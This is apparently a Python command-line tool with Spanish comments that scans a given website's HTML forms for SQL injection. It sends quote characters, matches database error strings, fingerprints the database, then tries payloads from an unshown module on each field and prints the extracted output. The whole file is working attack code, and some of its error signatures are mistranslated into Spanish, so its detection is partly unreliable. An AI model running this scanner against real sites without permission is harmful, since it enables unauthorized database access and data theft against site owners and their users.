import argparse
import requests
import logging
from pprint import pprint
from payloads import payloads
from urllib.parse import urljoin
from bs4 import BeautifulSoup as bs
from colorama import init, Fore, Style

# inicializar una sesión HTTP y configurar el navegador
log = False
request_type = "no"
database = 'Not found'
database_found = 'False'
useragent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36"
s = requests.Session()
s.headers["User-Agent"] = useragent

init()

def ft_parse_args():
	parser = argparse.ArgumentParser(description="Comprobar si un sitio web es vulnerable a la inyección SQL")
	parser.add_argument("URL", help="URL para comprobar si es vulnerable a la inyección SQL")
	parser.add_argument("-o", "--output", nargs="?", default=0, help="Archivo de salida para guardar los resultados")
	parser.add_argument("-X", "--request", nargs="?", default=0, help="Especifique el tipo de solicitud GET o POST (por defecto: GET")
	parser.add_argument("-c", "--cookie", type=str, help="Especificar cookie de inicio de sesión")
	parser.add_argument("-u", "--user-agent", type=str, nargs="?", default=1, help="Especificar agente de usuario")
	args = parser.parse_args()
	return args

def ft_set_cookies(cookie):
	key, val = cookie.split("=")
	if log == True:
		logging.info("Setting cookie: {}={}".format(key, val))
	else:
		print("Setting cookie: {}={}".format(key, val))
	s.cookies.set(name=key, value=val)

def ft_get_all_forms(url):
	"""Dada una `url`, devuelve todas las formas del contenido HTML"""
	res = s.get(url)
	# print(res.text)
	soup = bs(res.content, "html.parser")
	return soup.find_all("form")

def ft_get_form_details(form):
	"""
	Esta función extrae toda la información útil posible sobre un `formulario` HTML
	"""
	details = {}
	# obtener la acción del formulario (url de destino)
	try:
		action = form.attrs.get("action").lower()
	except:
		action = None
	if request_type == "no":
		# obtener el método del formulario (POST, GET, etc.)
		method = form.attrs.get("method", "get").lower()
	else:
		method = request_type.lower()
	# obtener todos los detalles de entrada como tipo y nombre
	inputs = []
	for input_tag in form.find_all("input"):
		input_type = input_tag.attrs.get("type", "text")
		input_name = input_tag.attrs.get("name")
		input_value = input_tag.attrs.get("value", "")
		inputs.append({"type": input_type, "name": input_name, "value": input_value})
	# poner todo en el diccionario resultante
	details["action"] = action
	details["method"] = method
	details["inputs"] = inputs
	return details

def ft_check_vulnerable(response):
	errors = {
		# MySQL
		"tiene un error en su sintaxis sql;",
		"advertencia: mysql",
		# SQL Server
		"unclosed quotation mark after the character string",
		# Oracle
		"comillas no cerradas después de la cadena de caracteres"
	}
	for error in errors:
		# si encuentra uno de estos errores, devuelve True
		if error in response.content.decode().lower():
			if database_found == 'False':
				ft_check_db(response)
			return True
	# no error detected
	return False

def ft_check_db(response):
	global database, database_found
	if "mariadb" in response.content.decode().lower():
		database = "MariaDB"
	elif "mongodb" in response.content.decode().lower():
		database = "MongoDB"
	elif "mysql" in response.content.decode().lower():
		database = "MySQL"
	elif "oracle" in response.content.decode().lower():
		database = "Oracle"
	elif "postgresql" in response.content.decode().lower():
		database = "PostgreSQL"
	elif "sqlite" in response.content.decode().lower():
		database = "SQLite"
	elif "microsoft sql server" in response.content.decode().lower():
		database = "SQL Server"
	elif "db2" in response.content.decode().lower():
		database = "DB2"
	elif "firebird" in response.content.decode().lower():
		database = "Firebird"
	elif "sybase" in response.content.decode().lower():
		database = "Sybase"
	elif "informix" in response.content.decode().lower():
		database = "Informix"
	database_found = "True"
	if log == True:
		logging.info("[+] Database: {}".format(database))
	else:
		print(Fore.GREEN + Style.BRIGHT + "[+] Database: {}".format(database))

def ft_scan_sql_injection(url):
	# test on HTML forms
	forms = ft_get_all_forms(url)
	if log == True:
		logging.info("[+] Testing URL: {}".format(url))
		logging.info("[+] Detected {} forms on {}.".format(len(forms), url))
	else:
		print("[+] Testing", url)
		print(Fore.YELLOW + Style.BRIGHT + "[+] Detected {} forms on {}.".format(len(forms), url))
		print(Style.RESET_ALL, end="")
	for form in forms:
		form_details = ft_get_form_details(form)
		for c in "\"'":
			# el cuerpo de datos que queremos enviar
			data = {}
			keys = []
			for input_tag in form_details["inputs"]:
				if input_tag["type"] == "hidden" or input_tag["value"]:
					# cualquier formulario de entrada que está oculto o tiene algún valor,
					# sólo úsalo en el cuerpo del formulario
					try:
						data[input_tag["name"]] = input_tag["value"] + c
					except:
						pass
				elif input_tag["type"] != "submit":
					if input_tag["name"] != "user_token":
						keys.append(input_tag["name"])
					# todos los demás excepto submit, utilizan algunos datos basura con carácter especial
					data[input_tag["name"]] = f"test{c}"
			# une la url con la acción (URL de solicitud del formulari
			url = urljoin(url, form_details["action"])
			if form_details["method"] == "post":
				res = s.post(url, data=data)
			elif form_details["method"] == "get":
				res = s.get(url, params=data)
			# comprobar si la página resultante es vulnerable
			if ft_check_vulnerable(res):
				if log == True:
					logging.info("[+] {} Podría ser vulnerable a la inyección SQL".format(url))
				else:
					print(Fore.GREEN + Style.BRIGHT + "[+] {} Podría ser vulnerable a la inyección SQL".format(url))
					print(Style.RESET_ALL, end="")
				for k in keys:
					if log == True:
						logging.info("\t[+] Key: {}".format(k))
					else:
						print("\t[+] Key: {}".format(k))
					ft_inject_sql(url, data, k, payloads, form_details["method"].upper())
			else:
				if log == True:
					logging.error("[-] Vulnerabilidad de inyección SQL no detectada")
				else:
					print(Fore.RED + Style.BRIGHT + "[-] Vulnerabilidad de inyección SQL no detectada")
					print(Style.RESET_ALL, end="")

def ft_inject_sql(url, data, key, payloads, method):
	for p_type in payloads:
		for i in payloads[p_type]:
			data[key] = i
			if method == "POST":
				res = s.post(url, data=data)
			elif method == "GET":
				res = s.get(url, params=data)
			if not ft_check_vulnerable(res):
				soup = bs(res.content, "html.parser")
				if soup.find_all("pre") == []:
					continue
				if log == True:
					logging.info("\t\t[-] Vulnerabilidad de inyección SQL detectada, tipo: {}".format(p_type))
					logging.info("\t\t[-] Payload: {}".format(i))
					logging.info(soup.find_all("pre"))
				else:
					print(Fore.GREEN + Style.BRIGHT + "\t\t[-] Vulnerabilidad de inyección SQL detectada, tipo: {}".format(p_type))
					print(Fore.GREEN + Style.BRIGHT + "\t\t[-] Payload: {}".format(i))
					print(Style.RESET_ALL, end="")
					pprint(soup.find_all("pre"))
				break;

def ft_start_logs(output):
	global log
	log = True
	logging.basicConfig(
		level=logging.INFO,  # Establece el nivel de registro (DEBUG, INFO, WARNING, ERROR, CRITICAL)
		format='%(asctime)s - %(levelname)s - %(message)s',  # Establecer el formato del mensaje de registro
		datefmt='%Y-%m-%d %H:%M:%S',  # Establecer el formato fecha/hora
		filename=output,  # Especificar el archivo de registro
		filemode='w'  # Establece el modo del archivo de registro (w: write, a: append)
	)

def main():
	global request_type, s
	args = ft_parse_args()
	if args.output is None:
		args.output = "vaccine.log"
	if args.output:
		ft_start_logs(args.output)
	if args.cookie:
		ft_set_cookies(args.cookie)
	if args.request is None:
		args.request = "GET"
	if args.request:
		if args.request.upper() == "GET" or args.request.upper() == "POST":
			request_type = args.request.upper()
		else:
			if log == True:
				logging.error("Tipo de petición incorrecto, sólo se permiten GET o POST")
			else:
				print(Fore.RED + Style.BRIGHT + "Tipo de petición incorrecto, sólo se permiten GET o POST")
			exit()
	if args.user_agent is None:
		if log == True:
			logging.warning("No se ha proporcionado ningún agente de usuario, se utiliza el predeterminado")
		else:
			print(Fore.YELLOW + Style.BRIGHT + "No se ha proporcionado ningún agente de usuario, se utiliza el predeterminado")
			print(Style.RESET_ALL, end="")
	elif args.user_agent != 1:
		useragent = args.user_agent
		s.headers["User-Agent"] = useragent
		if log == True:
			logging.info("Agente de usuario establecido en: {}".format(useragent))
		else:
			print(Fore.YELLOW + Style.BRIGHT + "Agente de usuario establecido en: {}".format(useragent))
			print(Style.RESET_ALL, end="")
	if args.URL:
		if log == True:
			logging.info("URL: " + args.URL)
		else:
			print("URL: " + args.URL)
		ft_scan_sql_injection(args.URL)
	else:
		if log == True:
			logging.error("No URL provided")
		else:
			print("No URL provided")

if __name__ == "__main__":
	main()